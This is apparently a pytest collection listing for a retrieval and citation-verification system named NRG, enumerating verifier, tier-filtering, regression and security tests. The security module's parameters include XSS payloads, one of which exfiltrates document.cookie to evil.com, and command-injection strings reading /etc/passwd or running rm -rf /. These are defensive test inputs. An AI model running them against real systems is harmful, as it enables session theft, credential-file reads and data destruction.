═══════════════════════════════════════════════════════
  NRG Full Test Suite
  Evidence dir: evidence/2026-05-05/ci_runner_gate_followup/local_release_collect
  JUnit XML:    evidence/2026-05-05/ci_runner_gate_followup/local_release_collect/test_suite_full_final.xml
  Test audit:   evidence/2026-05-05/ci_runner_gate_followup/local_release_collect/audit_chain/{worker}
═══════════════════════════════════════════════════════
/Users/srujansai/Desktop/NRG/.venv/lib/python3.11/site-packages/pytest_asyncio/plugin.py:247: PytestDeprecationWarning: The configuration option "asyncio_default_fixture_loop_scope" is unset.
The event loop scope for asynchronous fixtures will default to the fixture caching scope. Future versions of pytest-asyncio will default the loop scope for asynchronous fixtures to function scope. Set the default fixture loop scope explicitly in order to avoid unexpected behavior in the future. Valid fixture loop scopes are: "function", "class", "module", "package", "session"

  warnings.warn(PytestDeprecationWarning(_DEFAULT_FIXTURE_LOOP_SCOPE_UNSET))
/Users/srujansai/Desktop/NRG/.venv/lib/python3.11/site-packages/pytest_asyncio/plugin.py:247: PytestDeprecationWarning: The configuration option "asyncio_default_fixture_loop_scope" is unset.
The event loop scope for asynchronous fixtures will default to the fixture caching scope. Future versions of pytest-asyncio will default the loop scope for asynchronous fixtures to function scope. Set the default fixture loop scope explicitly in order to avoid unexpected behavior in the future. Valid fixture loop scopes are: "function", "class", "module", "package", "session"

  warnings.warn(PytestDeprecationWarning(_DEFAULT_FIXTURE_LOOP_SCOPE_UNSET))
[1m============================= test session starts ==============================[0m
platform darwin -- Python 3.11.7, pytest-8.2.2, pluggy-1.6.0 -- /Users/srujansai/Desktop/NRG/.venv/bin/python
cachedir: .pytest_cache
            → RESOLUTION: Model's qualitative trend insight wins; note DB gap.
              Surface both with explicit uncertainty flag.
          <Function test_confidence_delta_surface_when_unresolvable>
            When neither path can claim authority, surface both with confidence delta.

            Example:
              Model: "IIT Delhi is the top AI research institute in India"
              DB:    "IIT Bombay has higher avg h-index (42) than IIT Delhi (38)"
            → Both are partially correct but frame the question differently
            → Surface both answers with explicit confidence weights; do not merge
        <Class TestTwoBrainIntegration>
          Integration test: full Two-Brain pipeline with conflict resolution.
          <Function test_full_pipeline_routes_and_resolves>
            Simulate full pipeline: route → parallel fetch → conflict → resolve.

            Expected flow:
            1. Classifier marks query as requiring both model + DB paths
            2. Model internalized path returns qualitative answer
            3. DB retrieval path returns exact facts
            4. Conflict detected when answers disagree on same fact
            5. Resolution strategy applied (DB wins for exact facts)
            6. Merged response surfaced with confidence metadata
      <Module test_verifier_node.py>
        Tests for citation validation: DB resolution, stripping, enrichment, coverage.
        Phase 1: Fortify — zero hallucinated citations pass through.
        <Function test_nrg_state_carries_answer_engine_v1_fields>
        <Function test_verifier_marks_unsupported_numeric_answer_low_confidence>
        <Class TestCitationValidation>
          Phase 1: Every [cite:pub_id:chunk_id] must resolve to a real DB record.
          <Function test_valid_pub_id_passes_validation>
            PUB_001 exists in DB — citation is valid, citation_validity = 1.0.
          <Function test_hallucinated_pub_id_fails_validation>
            PUB_HALLUCINATED does NOT exist in DB — citation is stripped, logged.
          <Function test_mixed_valid_and_invalid_citations>
            One valid, one hallucinated — citation_validity = 0.5, invalid stripped.
          <Function test_structured_citation_always_valid>
            Structured citations [cite:structured:0] don't need DB validation.
          <Function test_chunk_id_citation_always_valid>
            Chunk citations [cite:chunk_1:0] don't need DB validation.
          <Function test_malformed_citation_type_stripped>
            Citation with unknown type prefix is stripped and logged.
          <Function test_duplicate_citations_deduplicated>
            Same citation appearing twice is counted once and deduplicated.
          <Function test_duplicate_structured_citations_with_sql_rows_are_verified>
            Repeated [cite:structured:0] tokens from SQL fast paths should dedupe, not force retry.
          <Function test_enriched_citations_contain_metadata>
            Valid publication citations are enriched with title, authors, year, DOI.
          <Function test_invalid_citation_logged>
            Invalid citations are appended to invalid_citations.jsonl.
        <Class TestCitationStripping>
          Invalid citations are stripped from synthesized_response text.
          <Function test_strip_function_removes_invalid_only>
            _strip_invalid_citations removes only invalid tokens.
          <Function test_stripped_response_preserves_text_around>
            Stripping doesn't break surrounding text.
        <Class TestCitationCoverage>
          Phase 2: Citation coverage metric — % of sentences with at least one citation.
          <Function test_coverage_calculation>
            _calculate_citation_coverage returns fraction of cited sentences.
        <Class TestCitationDeduplication>
          Phase 2: Same source cited multiple times consolidates into one reference.
          <Function test_deduplicate_removes_duplicates>
            _deduplicate_citations keeps first occurrence only.
      <Module test_verifier_numeric_faithfulness.py>
        <Function test_verifier_rejects_unsupported_numeric_claim_from_sql_rows>
        <Function test_verifier_accepts_crore_scaled_numeric_claim_from_sql_rows>
        <Function test_verifier_rejects_supported_numeric_claim_without_sentence_citation>
      <Module test_workflow_pipeline.py>
        <Function test_workflow_runs_full_orchestration_pipeline>
        <Function test_workflow_surfaces_rag_failures_as_warnings>
    <Package property>
      <Module test_citation_presence.py>
        Property-Based Tests: Citation Presence
        Verify: every citation in response has corresponding evidence
        <Class TestCitationPresence>
          Verify every citation has corresponding evidence in response.
          <Function test_citation_with_source_has_evidence>
            Citation with source should have provenance evidence.
          <Function test_citation_without_source_fails_verification>
            Citation without source should fail verification.
          <Function test_all_retrieval_sources_have_citations>
            Every retrieval source should contribute at least one citation.
          <Function test_empty_citations_with_sources_warns>
            When retrieval_sources is non-empty but citations is empty, should warn.
          <Function test_citation_chain_is_complete>
            Citation chain from query to response must be complete.
          <Function test_no_phantom_citations>
            Response must not reference citations not in provenance.
      <Module test_tier_filtering_always_returns_subset.py>
        Property-Based Tests: Tier Filtering Always Returns Subset
        Verify: researcher ⊇ government ⊇ industry (every record in lower tier is in higher)
        Generate 100 random queries, verify results obey tier hierarchy
        <Class TestTierFilteringSubset>
          Verify tier hierarchy: researcher ⊇ government ⊇ industry
          <Function test_tier_filtering_hierarchy_researcher_superset>
            Researcher tier should see superset of government data.
          <Function test_tier_filtering_hierarchy_government_superset>
            Government tier should see superset of industry data.
          <Function test_researcher_includes_all_tiers>
            Researcher queries should include all data visible to lower tiers.
          <Function test_random_queries_researcher_tier[AI researchers in Gujarat]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_researcher_tier[Machine learning experts]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_researcher_tier[Data science researchers]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_researcher_tier[NLP researchers in India]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_researcher_tier[Computer vision research groups]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_researcher_tier[Robotics researchers]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_researcher_tier[Deep learning experts]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_researcher_tier[AI publications from IITs]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_researcher_tier[Research areas in AI]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_researcher_tier[Researchers working on LLMs]>
            Researcher tier queries should always return tier 1 responses.
          <Function test_random_queries_government_tier[AI researchers in Gujarat]>
            Government tier queries should return tier 2 responses.
          <Function test_random_queries_government_tier[Policy recommendations for AI]>
            Government tier queries should return tier 2 responses.
          <Function test_random_queries_government_tier[Research statistics by state]>
            Government tier queries should return tier 2 responses.
          <Function test_random_queries_government_tier[Government research funding]>
            Government tier queries should return tier 2 responses.
          <Function test_random_queries_industry_tier[AI researchers in Gujarat]>
            Industry tier queries should return tier 3 responses.
          <Function test_random_queries_industry_tier[Industry collaboration opportunities]>
            Industry tier queries should return tier 3 responses.
          <Function test_random_queries_industry_tier[Anonymized researcher profiles]>
            Industry tier queries should return tier 3 responses.
          <Function test_tier_filtering_consistency_across_multiple_queries>
            Tier relationship should remain consistent across multiple queries.
          <Function test_tier_filtering_no_data_leaks_upward>
            Lower tier should not see data that higher tiers cannot see.
      <Module test_token_budget_never_exceeded.py>
        Property-Based Tests: Token Budget Never Exceeded
        Verify: no single query exceeds max token budget
        <Class TestTokenBudget>
          Verify no single query exceeds max token budget.
          <Function test_token_usage_within_budget>
            Token usage must stay within budget.
          <Function test_token_usage_exceeds_budget_returns_warning>
            Exceeding token budget should return a warning.
          <Function test_token_tracking_multiple_queries>
            Multiple queries should each track their own token budget.
          <Function test_large_response_still_within_budget>
            Large responses should still respect token budget.
          <Function test_token_budget_enforced_across_tiers>
            Token budget should be enforced across all tiers.
          <Function test_combined_query_conversation_token_budget>
            Conversation history combined with query should respect token budget.
    <Package regression>
      <Module test_bug_fixes.py>
        Regression Suite: Every bug fix gets a test here
        Mark with @pytest.mark.regression
        Group by component
        <Class TestRegressionAuth>
          Regression tests for authentication issues.
          <Function test_invalid_credentials_returns_401>
            Bug fix: Invalid credentials should return 401, not crash with 500.
          <Function test_expired_token_returns_401>
            Bug fix: Expired access token should return 401.
          <Function test_missing_auth_header_returns_403>
            Bug fix: Missing Authorization header should return 403.
        <Class TestRegressionQuery>
          Regression tests for query processing issues.
          <Function test_empty_query_returns_400>
            Bug fix: Empty query should be handled gracefully (200 or 400/422).
          <Function test_very_long_query_handled>
            Bug fix: Very long query should be handled, not cause memory issues.
          <Function test_query_with_special_characters>
            Bug fix: Query with special characters should not cause crashes.
        <Class TestRegressionRBAC>
          Regression tests for RBAC issues.
          <Function test_industry_cannot_see_phone>
            Bug fix: Industry tier should not see researcher phone numbers.
          <Function test_government_sees_aggregates_not_individual>
            Bug fix: Government tier should see aggregated, not individual records.
        <Class TestRegressionAPI>
          Regression tests for API endpoint issues.
          <Function test_health_endpoint_works_when_db_down>
            Bug fix: Health endpoint should return status even if DB is unavailable.
          <Function test_cache_invalidation_on_redis_failure>
            Bug fix: Cache invalidation should not crash when Redis is down.
        <Class TestRegressionSecurity>
          Regression tests for security issues.
          <Function test_sql_injection_in_query_param>
            Bug fix: SQL injection via query parameter should be handled safely.
          <Function test_xss_in_query_sanitized>
            Bug fix: XSS payloads in query should be sanitized.
    <Package scripts>
      <Module test_batch4_data_sql_schema_audit.py>
        <Function test_read_module_constant_handles_annotated_alembic_constants>
        <Function test_upgrade_risk_markers_handles_typed_upgrade_signature>
        <Function test_upgrade_risk_markers_only_flags_upgrade_body>
        <Function test_collect_plan_relations_returns_nested_relation_names>
      <Module test_build_qdrant_index.py>
        <Function test_get_collection_info_treats_small_threshold_exempt_collection_as_complete>
      <Module test_capture_killer_query_evidence.py>
        <Function test_capture_harness_respects_explicit_database_url>
        <Function test_capture_harness_defaults_to_populated_local_database>
        <Function test_capture_harness_upgrades_default_root_database_url>
        <Function test_explain_writer_registers_sqlite_split_part>
      <Module test_check_env.py>
        <Function test_cloud_synthesis_false_is_valid_opt_in_default>
        <Function test_cloud_synthesis_true_is_valid_explicit_opt_in>
        <Function test_cloud_synthesis_rejects_non_boolean_values>
        <Function test_empty_staged_env_list_does_not_warn>
      <Module test_check_slow_test_markers.py>
        <Function test_long_timeout_requires_slow_marker>
        <Function test_slow_marker_allows_long_timeout>
        <Function test_module_slow_marker_allows_long_timeout>
      <Module test_ingest_nrg_db.py>
        <Function test_full_schema_contains_real_nrg_tables_and_columns>
        <Function test_ingest_nrg_database_loads_csvs_documents_and_is_idempotent>
      <Module test_ingest_qdrant.py>
        <Function test_chunking_uses_512_with_50_overlap>
        <Function test_dry_run_reports_ready_message>
        <Function test_non_dry_run_upserts_with_idempotent_point_ids>
      <Module test_ingest_qdrant_documents.py>
        <Function test_parse_document_txt_reads_frontmatter>
        <Function test_access_tier_mapping>
        <Function test_parse_legacy_metadata_block>
        <Function test_parse_json_fenced_metadata_with_blank_arrays>
        <Function test_dry_run_prepares_points_without_qdrant>
        <Function test_ingest_upserts_idempotent_point_ids_and_metadata>
        <Function test_prebuilt_payload_without_vectors_flows_through_embedding>
      <Module test_insert_test_data_qdrant.py>
        <Function test_qdrant_test_data_seeder_uses_supported_client_kwargs>
      <Module test_missing_script_modules.py>
        <Function test_migration_and_audit_investigation_scripts_import>
        <Function test_seed_relations_script_invocation_can_import_src>
      <Module test_phase7_preflight.py>
        <Function test_phase7_preflight_blocks_without_helm>
        <Function test_phase7_preflight_marks_triggers_ready>
        <Function test_cli_require_returns_nonzero_when_task_blocked>
      <Module test_prewarm_release_cache.py>
        <Function test_default_release_queries_cover_three_acceptance_questions>
        <Function test_query_payload_uses_production_query_contract>
        <Coroutine test_prewarm_queries_posts_each_query_to_query_endpoint>
      <Module test_pydantic_migration_guard.py>
        <Function test_ci_guard_requires_required_jobs_to_pin_below_python_314>
        <Function test_ci_guard_accepts_pinned_jobs_and_allowed_failure_314_lane>
        <Function test_direct_pydantic_v1_import_inventory_ignores_docs_and_reports_code>
        <Function test_main_requires_migration_plan_document>
      <Module test_quality_bar_scorecard.py>
        <Function test_c5_uses_scheduler_dry_run_when_live_qdrant_is_unavailable>
        <Function test_c4_scorecard_creates_locust_report_parent>
        <Function test_c4_scorecard_can_run_locust_with_multiple_processes>
        <Function test_c4_scorecard_rejects_target_text_without_numeric_p99>
        <Function test_c4_scorecard_rejects_failure_rate_above_zero>
        <Function test_c4_scorecard_extracts_locust_percentile_table_when_summary_is_missing>
        <Function test_c4_scorecard_reads_numeric_p99_from_locust_report>
        <Function test_c4_scorecard_reads_per_endpoint_metrics_from_locust_report>
        <Function test_c4_scorecard_ignores_response_percentile_objects_without_request_counts>
        <Function test_c4_locustfile_preissued_token_path_does_not_send_forwarded_ip>
      <Module test_red_team_live_replay.py>
        Regression coverage for the LB-5 live replay harness.
        <Function test_corpus_meets_lb5_minimums>
        <Function test_baseline_safe_http_without_leak_is_downgraded>
        <Function test_expected_safe_control_can_remain_allowed_safe>
        <Function test_dangerous_response_is_failure_decision>
        <Function test_summary_flags_uncontained_baseline_decisions>
        <Function test_local_api_startup_skips_embedder_warmup>
      <Module test_red_team_replay_script.py>
        <Function test_red_team_replay_uses_bounded_curl_timeouts>
        <Function test_red_team_replay_fails_fast_and_does_not_lock_demo_users>
        <Function test_red_team_replay_never_counts_http_000_as_pass_or_warning>
        <Function test_red_team_replay_xss_tests_fail_on_transport_errors>
      <Module test_repair_qdrant_payloads.py>
        <Function test_infer_public_metadata_defaults_missing_vectors_to_tier3>
        <Function test_repair_collection_dry_run_reports_stale_points>
        <Function test_repair_collection_upserts_enriched_vectors>
      <Module test_run_critical_path_contract.py>
        <Function test_api_image_includes_alembic_config>
        <Function test_critical_path_runner_uses_container_venv_alembic_with_config>
        <Function test_final_runner_delegates_to_strict_verified_runner_and_uses_login_username>
      <Module test_runtime_image_scan_gate.py>
        <Function test_runtime_image_gate_accepts_clean_frontend_nginx_and_no_fix_api_boundary>
        <Function test_runtime_image_gate_fails_fixable_api_high>
        <Function test_runtime_image_gate_fails_pip_audit_vulnerability>
      <Module test_scan_env_history_secrets.py>
        <Function test_secret_assignment_detects_sensitive_keys_without_value_leak>
        <Function test_secret_assignment_ignores_placeholders_and_non_secret_keys>
        <Function test_text_output_redacts_secret_value>
        <Function test_remediation_summary_groups_paths_keys_and_rotation_classes>
        <Function test_remediation_summary_pass_when_no_findings>
        <Function test_rotation_class_mapping_keeps_unknowns_visible>
      <Module test_seed_local_quality_fixtures.py>
        <Function test_seed_quality_fixtures_populates_empty_core_tables>
        <Function test_seed_quality_fixtures_only_tops_up_existing_rows>
      <Module test_seed_relations.py>
        <Function test_seed_relations_supports_current_sqlite_schema>
      <Module test_sovereign_deploy_script.py>
        <Function test_sovereign_deploy_script_help_runs>
        <Function test_sovereign_deploy_script_imports>
      <Module test_vector_drift_scheduler.py>
        Tests for vector_drift_scheduler.py — 60s drift scheduler.
        <Class TestShouldTriggerReindex>
          Test reindex trigger policy logic.
          <Function test_triggers_when_reindex_info_flag_set>
          <Function test_triggers_when_max_shift_breaches_threshold>
          <Function test_triggers_when_drift_alert_warning>
          <Function test_triggers_when_drift_alert_critical>
          <Function test_no_trigger_when_stable_and_no_flags>
        <Function test_default_check_skips_benchmark_when_qdrant_has_no_indexed_vectors>
        <Coroutine test_run_once_calls_check_fn>
        <Coroutine test_run_once_triggers_reindex_when_needed>
        <Coroutine test_run_once_no_trigger_when_stable>
        <Coroutine test_loop_runs_max_iterations>
        <Coroutine test_loop_returns_schedulerrun_list>
        <Coroutine test_interval_must_be_positive>
      <Module test_verify_db_merge.py>
        <Function test_project_source_reader_repairs_title_commas_and_glued_rows>
        <Function test_lab_and_funding_source_readers_split_glued_records>
      <Module test_verify_intake_bundle.py>
        <Function test_verify_csv_hmacs_accepts_valid_rows>
        <Function test_verify_csv_hmacs_reports_invalid_rows>
        <Function test_verify_bundle_checks_manifest_hash_and_hmac>
    <Package security>
      <Module test_admin_rbac_routes.py>
        Admin route RBAC regressions.
        <Function test_tier3_is_blocked_from_admin_and_metrics_routes>
      <Module test_adversarial_inputs.py>
        Security Tests: Adversarial Inputs
        Tests PII injection, XSS, command injection, tier bypass, and DPDP consent violations.
        <Class TestPIIInjection>
          PII injection attempts in query payloads should be sanitized.
          <Function test_pii_in_query_sanitized[My Aadhaar is 1234-5678-9012]>
            PII in query should be sanitized or blocked (DLP).
          <Function test_pii_in_query_sanitized[My PAN is ABCDE1234F]>
            PII in query should be sanitized or blocked (DLP).
          <Function test_pii_in_query_sanitized[Call me at 9876543210]>
            PII in query should be sanitized or blocked (DLP).
          <Function test_pii_in_query_sanitized[Email me at test@example.com]>
            PII in query should be sanitized or blocked (DLP).
          <Function test_pii_in_query_sanitized[My Aadhaar: 123456789012]>
            PII in query should be sanitized or blocked (DLP).
          <Function test_pii_in_query_sanitized[PAN: ABCDE1234F]>
            PII in query should be sanitized or blocked (DLP).
          <Function test_pii_in_query_sanitized[Phone: +91-9876543210]>
            PII in query should be sanitized or blocked (DLP).
          <Function test_pii_in_query_sanitized[aadhaar: 1234-5678-9012]>
            PII in query should be sanitized or blocked (DLP).
          <Function test_pii_in_query_sanitized[My VID is 1234-5678-9012-5432]>
            PII in query should be sanitized or blocked (DLP).
          <Function test_bulk_pii_extraction_attempt_blocked>
            Bulk PII extraction should be detected and blocked.
        <Class TestXSSBlocking>
          XSS payloads in queries should be sanitized.
          <Function test_xss_payload_sanitized[<script>alert(1)</script>]>
            XSS payloads should be blocked or sanitized.
          <Function test_xss_payload_sanitized[Hello <img src=x onerror=alert(1)>]>
            XSS payloads should be blocked or sanitized.
          <Function test_xss_payload_sanitized[<svg/onload=alert(1)>]>
            XSS payloads should be blocked or sanitized.
          <Function test_xss_payload_sanitized[Test <iframe src=javascript:alert(1)>]>
            XSS payloads should be blocked or sanitized.
          <Function test_xss_payload_sanitized['; alert(1); var x=']>
            XSS payloads should be blocked or sanitized.
          <Function test_xss_payload_sanitized[{{constructor.constructor('alert(1)')()}}]>
            XSS payloads should be blocked or sanitized.
          <Function test_xss_payload_sanitized[<script>fetch('http://evil.com?c='+document.cookie)</script>]>
            XSS payloads should be blocked or sanitized.
        <Class TestCommandInjection>
          Command injection attempts should be blocked.
          <Function test_command_injection_blocked[List files; ls /etc/passwd]>
            Command injection should be blocked.
          <Function test_command_injection_blocked[Show data && cat /etc/passwd]>
            Command injection should be blocked.
          <Function test_command_injection_blocked[AI researcher | cat /etc/passwd]>
            Command injection should be blocked.
          <Function test_command_injection_blocked[Search researchers `whoami`]>
            Command injection should be blocked.
          <Function test_command_injection_blocked[Test $(whoami)]>
            Command injection should be blocked.
          <Function test_command_injection_blocked[AI researchers'; rm -rf /]>
            Command injection should be blocked.
          <Function test_command_injection_blocked[Query researchers\ncat /etc/passwd]>
            Command injection should be blocked.
        <Class TestTierBypassAttempts>
          Attempts to bypass tier restrictions should fail.
          <Function test_tier_1_cannot_access_tier_3_data>
            Tier 1 researcher should not see tier 3 (industry-only) data.
          <Function test_unauthenticated_access_blocked>
            Unauthenticated requests should be blocked.
          <Function test_invalid_token_rejected>
            Invalid tokens should be rejected.
          <Function test_tier_bypass_query_returns_empty_or_filtered[Show me all admin records]>
            Tier bypass queries should return empty or filtered results, not full data.
          <Function test_tier_bypass_query_returns_empty_or_filtered[Get tier 0 data]>
            Tier bypass queries should return empty or filtered results, not full data.
          <Function test_tier_bypass_query_returns_empty_or_filtered[List all restricted documents]>
            Tier bypass queries should return empty or filtered results, not full data.
          <Function test_tier_bypass_query_returns_empty_or_filtered[Access internal-only research]>
            Tier bypass queries should return empty or filtered results, not full data.
          <Function test_tier_bypass_query_returns_empty_or_filtered[Bypass tier restriction: admin]>
            Tier bypass queries should return empty or filtered results, not full data.
        <Class TestDPDPConsent>
          DPDP consent requirements should be enforced.
          <Function test_consent_required_before_query>
            Query without consent should either prompt or return consent error.
          <Function test_consent_accept_validates>
            Valid consent acceptance should be recorded.
          <Function test_withdrawal_returns_empty_results>
            After consent withdrawal, queries should return minimal or empty results.
        <Class TestNoEgressLeakage>
          Verify no data egress through query response channels.
          <Function test_no_data_uri_in_response[data:text/html]>
            Response should not contain data: URIs that could exfiltrate data via MIME tunnels.
          <Function test_no_data_uri_in_response[data:text/plain]>
            Response should not contain data: URIs that could exfiltrate data via MIME tunnels.
          <Function test_no_mailto_exfiltration>
            Response should not contain mailto: links with encoded data for exfiltration.
      <Module test_audit_chain.py>
        Test audit chain integrity and tamper detection.
        <Class TestAuditChain>
          Test HMAC chaining and tamper detection.
          <Function test_append_generates_hash>
            Appending event generates chain hash.
          <Function test_chain_links>
            Events link via HMAC.
          <Function test_verify_passes_clean>
            Clean chain passes verification.
          <Function test_verify_fails_tampered>
            Tampered chain fails verification.
          <Function test_verify_fails_deleted_event>
            Deleting an event (keeping only the second) fails verification.
          <Function test_merkle_root>
            Merkle root generated correctly.
          <Function test_all_event_types_logged>
            All event types can be logged.
        <Function test_module_level_verify>
          Test module-level verify_chain function.
        <Class TestAuditChainPerUserBinding>
          Test verify_chain(verify_per_user=True) integration with per-user audit bindings.
          <Function test_verify_chain_per_user_passes_fresh_log>
            A fresh audit log with per-user bindings passes verify_chain(verify_per_user=True).
          <Function test_verify_chain_per_user_detects_tampered_kid>
            Modifying jwt_kid in stored event causes chain hash mismatch (primary detection).
          <Function test_verify_chain_per_user_detects_tampered_fingerprint>
            Modifying request_fingerprint in stored event causes chain hash mismatch.
          <Function test_verify_chain_per_user_false_allows_tampered_binding>
            With verify_per_user=False, chain integrity is verified but per-user bindings are skipped.

            Note: Modifying jwt_kid or request_fingerprint in the stored event changes the chain hash,
            so the chain verification will fail regardless of verify_per_user setting.
            This test verifies the baseline chain integrity check works.
          <Function test_verify_chain_per_user_system_events_skip_binding>
            System events are verified without per-user binding.
          <Function test_verify_chain_per_user_multiple_users>
            Multiple users with distinct per-user bindings all verify correctly.
          <Function test_verify_chain_per_user_empty_log>
            An empty audit chain passes verification.
          <Function test_verify_chain_per_user_mixed_events>
            Mix of user and system events verifies correctly.
      <Module test_data_boundary.py>
        Security Tests - Data Boundary Enforcement.
        <Class TestDataBoundary>
          Test data boundary enforcement.
          <Function test_no_raw_db_schema_to_llm>
            Test schema-only sent to LLM, not full schema.
          <Function test_vector_metadata_filtered>
            Test vector results have metadata filtering.
          <Function test_audit_log_created>
            Test audit log entries created.
        <Class TestAccessControl>
          Test access control mechanisms.
          <Function test_tier1_can_access_all>
            Test Tier 1 access.
          <Function test_tier2_restricted>
            Test Tier 2 restrictions applied.
          <Function test_tier3_most_restricted>
            Test Tier 3 most restricted.
      <Module test_egress_allowlist.py>
        Tests for egress allowlist - Protocol #39: Schema Allowlist.

        Tests the YAML-based allowlist integration with SovereignHTTPXClient
        and the EgressSchemaAllowlist loader.
        <Class TestEgressSchemaAllowlistLoader>
          Unit tests for EgressSchemaAllowlist loader.
          <Function test_is_table_allowed_valid>
          <Function test_is_table_allowed_invalid>
          <Function test_is_column_allowed_valid>
          <Function test_is_column_allowed_blocked>
          <Function test_get_blocked_content_returns_frozenset>
          <Function test_is_llm_prompt_allowed>
          <Function test_get_allowed_tables>
          <Function test_get_table_columns>
        <Class TestSovereignHTTPXClientAllowed>
          Allowed content tests - should NOT raise.
          <Function test_allowed_user_query>
          <Function test_allowed_schema_prompt_valid_table>
          <Function test_allowed_plan_json>
          <Function test_allowed_citation_ids>
          <Function test_allowed_session_id>
        <Class TestSovereignHTTPXClientBlockedTables>
          Blocked table tests - should raise SovereigntyViolation.
          <Function test_blocked_unlisted_table_in_schema_prompt>
          <Function test_blocked_unlisted_table_join>
          <Function test_blocked_user_credentials_table>
          <Function test_blocked_passwords_table>
          <Function test_blocked_private_notes_table>
        <Class TestSovereignHTTPXClientBlockedColumns>
          Blocked column tests - should raise SovereigntyViolation.
          <Function test_blocked_email_column>
          <Function test_blocked_phone_column>
          <Function test_blocked_full_text_field>
          <Function test_blocked_fulltext_nested>
          <Function test_blocked_researcher_table_column_in_schema>
        <Class TestSovereignHTTPXClientBlockedPatterns>
          Blocked content pattern tests - should raise SovereigntyViolation.
          <Function test_blocked_raw_content_field>
          <Function test_blocked_raw_db_dump>
          <Function test_blocked_publication_text>
          <Function test_blocked_research_content>
          <Function test_blocked_full_publication_record>
        <Class TestYAMLHotReload>
          YAML hot-reload tests.
          <Function test_reload_on_mtime_change>
          <Function test_singleton_same_instance>
        <Class TestFalsePositives>
          False positive tests - legitimate queries should NOT be blocked.
          <Function test_researcher_name_not_blocked>
          <Function test_publication_title_not_blocked>
          <Function test_institution_name_not_blocked>
          <Function test_complex_query_with_multiple_tables>
          <Function test_aggregate_query>
      <Module test_egress_guard.py>
        Tests for egress guard — Protocol #39.

        Note: These tests reference the new EgressGuard architecture (egress_guard.py).
        The old SovereignHTTPXClient (src/security/egress/) was replaced by
        EgressGuard + egress_allowlist.yaml for schema-based allowlisting.

        Key differences:
        - Old: blocked sensitive fields (abstract, full_text, raw_content)
        - New: blocks schema elements not in allowlist, and dangerous patterns
          (SQL injection, credential extraction, schema probing)
        <Class TestEgressGuard>
          <Function test_check_passes_clean_text>
          <Function test_blocks_sql_injection_pattern>
          <Function test_blocks_schema_probing>
          <Function test_blocks_select_star>
          <Function test_blocks_credential_in_url>
          <Function test_filter_schema_removes_non_allowlisted_tables>
          <Function test_filter_schema_keeps_allowlisted>
          <Function test_filter_prompt_raises_on_violation>
          <Function test_filter_prompt_returns_filtered_on_violation_no_raise>
          <Function test_violations_accumulated>
          <Function test_singleton>
          <Function test_system_prompt_filter>
          <Function test_blocks_long_alphanumeric>
      <Module test_gateway.py>
        <Class TestGatewaySecurity>
          Test suite for Kong Gateway security features.
          <Function test_pii_detection_aadhaar>
            Test Aadhaar number detection.
          <Function test_pii_detection_pan>
            Test PAN number detection.
          <Function test_pii_detection_phone>
            Test Indian phone number detection.
          <Function test_prompt_injection_detection>
            Test prompt injection detection.
          <Function test_sanitisation>
            Test PII sanitisation.
          <Function test_kong_gateway_dlp_blocking>
            Test that Kong Gateway blocks PII-containing requests.
          <Function test_kong_gateway_injection_blocking>
            Test that Kong Gateway blocks prompt injection attempts.
          <Function test_kong_login_is_public_and_researchers_requires_jwt>
            Test Kong exposes login publicly but protects data endpoints.
          <Function test_query_validation>
            Test comprehensive query validation.
      <Module test_hmac_validation.py>
        Security Tests: HMAC Validation
        Invalid signature → 401, Expired timestamp → 401, Replay attack → blocked
        <Class TestHMACValidation>
          Verify HMAC signature validation for API requests.
          <Function test_invalid_signature_returns_401>
            Request with invalid HMAC signature should return 401 if HMAC is enforced.
          <Function test_expired_timestamp_returns_401>
            Request with expired timestamp should return 401 if HMAC is enforced.
          <Function test_replay_attack_blocked>
            Replayed request (same timestamp+signature) should be blocked if HMAC enforced.
          <Function test_valid_signature_succeeds>
            Request with valid HMAC signature should succeed.
          <Function test_missing_signature_header>
            Request without signature header should be handled.
          <Function test_missing_timestamp_header>
            Request without timestamp header should be handled.
          <Function test_future_timestamp_rejected>
            Request with future timestamp (clock skew) should be rejected if HMAC enforced.
      <Module test_kong_dlp_runtime.py>
        <Function test_kong_loads_custom_dlp_plugin>
